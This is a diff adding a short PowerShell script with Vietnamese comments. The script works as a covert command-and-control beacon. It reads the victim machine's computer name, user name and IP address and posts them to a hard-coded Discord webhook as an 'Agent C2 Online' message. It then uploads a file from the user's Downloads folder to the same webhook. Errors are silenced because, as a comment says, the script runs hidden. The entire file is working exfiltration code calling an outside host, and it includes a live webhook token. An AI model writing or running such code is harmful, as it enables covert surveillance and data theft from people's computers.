@@ -1,0 +1,36 @@
+$webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"
+
+# Lấy IP với fallback
+try {
+    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
+} catch {
+    $ipAddress = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.IPEnabled -and $_.IPAddress -ne $null }).IPAddress[0]
+}
+
+$embed = @{
+    content = "🚀 **Agent C2 Online**"
+    embeds = @(@{
+        title = "Thông tin máy mục tiêu"
+        color = 3066993
+        fields = @(
+            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
+            @{ name = "User"; value = $env:USERNAME; inline = $true }
+            @{ name = "IP Address"; value = $ipAddress; inline = $false }
+        )
+    })
+} | ConvertTo-Json -Depth 5
+
+# Gửi embed (bắt lỗi nếu webhook chết)
+try {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
+} catch {
+    # Không hiện lỗi ra console (vì chạy ẩn)
+}
+
+# Gửi file abc.txt nếu có
+$filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
+if (Test-Path $filePath) {
+    try {
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -InFile $filePath -ContentType "multipart/form-data"
+    } catch {}
+}
